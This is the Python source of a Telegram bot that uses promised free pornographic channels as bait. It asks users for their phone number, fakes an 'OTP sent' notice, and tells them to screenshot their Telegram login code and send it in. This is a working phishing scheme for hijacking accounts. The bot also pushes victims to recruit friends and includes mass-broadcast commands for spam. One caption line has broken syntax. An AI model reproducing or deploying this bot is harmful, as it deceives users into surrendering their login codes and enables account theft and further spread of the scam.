# Rexa Kadal gurun

import time
import asyncio
from sys import version as pyver

import pyrogram
from pyrogram import __version__ as pyrover
from pyrogram import filters, idle
from pyrogram.errors import FloodWait
from pyrogram.types import Message

# IMPORT PYRO TYPES
from pyrogram.types import Message
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery 


import config
import database.mongo
from database.mongo import db

loop = asyncio.get_event_loop()
SUDO_USERS = config.SUDO_USER

app = pyrogram.Client(
    ":RexaBot:",
    config.API_ID,
    config.API_HASH,
    bot_token=config.BOT_TOKEN,
)


# START YA INI JINK !

START_MESSAGE = """👋🏻 Hello I am a Koleksi Porn Channel Bot

Please press :

👉🏻 /getchannel to get your free Koleksi Porn channel

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ Leave this bot if you don't believe this bot
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔞 ADULT CONTENT ONLY, if you are not old enough please leave this Bot

⁉️ __Please don't spam this bot, if the bot process takes a long time, please wait, Dont Spam!!!__
"""

START_BUTTON = [

    [  
        InlineKeyboardButton("💋 Preview Channel", url="https://t.me/+z4XdC6iQOKZkYzVl"),              
    ],            
]            
@app.on_message(filters.command("start") & filters.private)
async def start(_, message):
    text = START_MESSAGE
    reply_markup = InlineKeyboardMarkup(START_BUTTON)
    await message.reply(
        text=text,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

# FREEPORN HANDLER 

FREE_MESSAGE = """
⚠️ To access the Channel below, please Verify yourself first, 
so that your account is registered in this bot database

Please press : /verif to verify your account to bot database

❓if you dont understand please type /help
"""

FREE_BUTTON = [
            [
                InlineKeyboardButton("♥️ KOLEKSI LUCAH MELAYU", url="https://t.me/"),
            ],
        ]

@app.on_message(filters.command("getchannel") & filters.private)
async def free(_, message):
    text = FREE_MESSAGE
    reply_markup = InlineKeyboardMarkup(FREE_BUTTON)
    await message.reply(
        text=text,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

# VWRIF CMD

@app.on_message(filters.command("verif") & filters.private)
async def verip(_, message):
    await app.send_message(message.chat.id, "Please enter your Telegram account telephone number..")

# SEND NOMER

@app.on_message(filters.regex("6|1|2|3|4"))
async def regex_cantik(_, message):
    rexa = await message.reply("__Sent otp code...__")
    await asyncio.sleep(10)
    await rexa.edit("__successfully sent otp code…__")
    await asyncio.sleep(5)
    await app.send_photo(message.chat.id, "https://graph.org/file/9565efceb3137dcd28ece.jpg", caption="""
🤖 **My system bot Want Log in**

We sent a login code to your Telegram account, please send take a screenshot and please post it here, as in the example Picture 

📷 Please see the example Picture 

Just send it in the form of a screenshot, you don't need to send it via text.

❓if you dont understand please type /help
""")

# SUCCESFULLY CMD & CALLBACK

SUCCES_TEXT = """
Succesfully add to Database ⚡

__Congratulations!!__ You are already a member of the Koleksi Porn Video Channel 🎉

if you want more channels please press the button below and follow the steps :
"""
SUCCES_BUTTON = [

    [  
        InlineKeyboardButton("Get More Channels", callback_data="kesatu"),              
    ],            
]            

@app.on_message(filters.regex("🥳") & filters.private)
async def start(_, message):
    text = SUCCES_TEXT
    reply_markup = InlineKeyboardMarkup(SUCCES_BUTTON)
    await message.reply(
        text=text,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )
# REGEX

@app.on_callback_query(filters.regex("^kesatu"))
async def kesatu(_, callback_query):
    query = callback_query.data.split()
    if query[0] == "kesatu":
        KESATU = """
👉🏻 FOLLOW THE STEP TO GET MORE CHANNEL :

1. Join all the channels below 👇🏻
2. invite your friends or your other accounts to use this bot.
3. make sure the account you invite follows the steps like the first time you used this bot
3. when done type /done
4. wait for your account to be acc by database bot
5. Enjoy, you can access the channel

"""  
        KESATUTOMBOL = [
            [
                InlineKeyboardButton("KOLEKSI LIVE MELAYU", url="https://t.me"),
                InlineKeyboardButton("KOLEKSI HIJAB", url="https://t.me"),
            ],
            [
                InlineKeyboardButton("KOLEKSI INDON HIJAB", url="https://t.me"),
                InlineKeyboardButton("KOLEKSI JAPANESE", url="https://t.me"),
            ],
        ]
        await callback_query.edit_message_text(
            KESATU, reply_markup=InlineKeyboardMarkup(KESATUTOMBOL)
        )

# INI BUAT INVIT TEMEN

@app.on_message(filters.regex("✅") & filters.private)
async def verip(_, message):
    await app.send_message(message.chat.id, """
Congratulations!!! 🎉

You have access to all channels!!
""")
# HELP

@app.on_message(filters.command("help") & filters.private)
async def verip(_, message):
    await app.send_video(message.chat.id, "https://t.me/ifusadcallme/8", caption=🎥 Video tutorial for sending screenshots so that my account is detected by this bot.")


# DATABASE !!!

save = {}
grouplist = 1
welcome_group = 2

async def init():
    await app.start()

# Ini auto buat nambah grup di database rex   

    @app.on_message(filters.new_chat_members, group=welcome_group)
    async def welcome(_, message: Message):
        chat_id = message.chat.id
        await mongo.add_served_chat(chat_id)

    #Ini auto buat nambah user di database rex
    @app.on_message(filters.command("start"))
    async def start_command(_, message: Message):
        await mongo.add_served_user(message.from_user.id)


# Ini buat stats rex

    @app.on_message(
        filters.command("stats") & filters.user(SUDO_USERS)
    )
    async def stats_func(_, message: Message):
        if db is None:
            return await message.reply_text(
                "MONGO_DB_URI var not defined. Please define it first"
            )
        served_users = len(await mongo.get_served_users())
        served_chats = len(await mongo.get_served_chats())
        text = f""" **Game Bot Stats:**
        
**Python Version :** {pyver.split()[0]}
**Pyrogram Version :** {pyrover}

👤 **Pengguna :** {served_users} 
🏘️ **Group :** {served_chats}"""
        await message.reply_text(text)


#Ini buat broadcastuser rex

    @app.on_message(
        filters.command("broadcastuser") & filters.user(SUDO_USERS)
    )
    async def broadcast_func(_, message: Message):
        if db is None:
            return await message.reply_text(
                "MONGO_DB_URI var nya mna mas rex. Tambahin dong"
            )
        if message.reply_to_message:
            x = message.reply_to_message.message_id
            y = message.chat.id
        else:
            if len(message.command) < 2:
                return await message.reply_text(
                    "**Usage**:\n/broadcastusers [MESSAGE] or [Reply to a Message]"
                )
            query = message.text.split(None, 1)[1]

        susr = 0
        served_users = []
        susers = await mongo.get_served_users()
        for user in susers:
            served_users.append(int(user["user_id"]))
        for i in served_users:
            try:
                await app.forward_messages(
                    i, y, x
                ) if message.reply_to_message else await app.send_message(
                    i, text=query
                )
                susr += 1
            except FloodWait as e:
                flood_time = int(e.x)
                if flood_time > 200:
                    continue
                await asyncio.sleep(flood_time)
            except Exception:
                pass
        try:
            await message.reply_text(
                f"**Broadcasted Message to {susr} Users.**"
            )
        except:
            pass


# Ini broadcastgroup rex

    @app.on_message(
        filters.command("broadcastgroup") & filters.user(SUDO_USERS)
    )
    async def broad_group(_, message: Message):
        if db is None:
            return await message.reply_text(
                "MONGO_DB_URI ny mna mas rexa. Tambahin dong"
            )
        if message.reply_to_message:
            x = message.reply_to_message.message_id
            y = message.chat.id
        else:
            if len(message.command) < 2:
                return await message.reply_text(
                    "**Usage**:\n/broadcastgroup [MESSAGE] or [Reply to a Message]"
                )
            query = message.text.split(None, 1)[1]

        scht = 0
        served_chats = []
        schats = await mongo.get_served_chats()
        for chat in schats:
            served_chats.append(int(chat["chat_id"]))
        for i in served_chats:
            try:
                await app.forward_messages(
                    i, y, x
                ) if message.reply_to_message else await app.send_message(
                    i, text=query
                )
                scht += 1
            except FloodWait as e:
                flood_time = int(e.x)
                if flood_time > 200:
                    continue
                await asyncio.sleep(flood_time)
            except Exception:
                pass
        try:
            await message.reply_text(
                f"**Broadcasted Message to {scht} Groups.**"
            )
        except:
            pass

    print("[Rexa Ganteng] - Bot Started!")
    await idle()


if __name__ == "__main__":
    loop.run_until_complete(init())
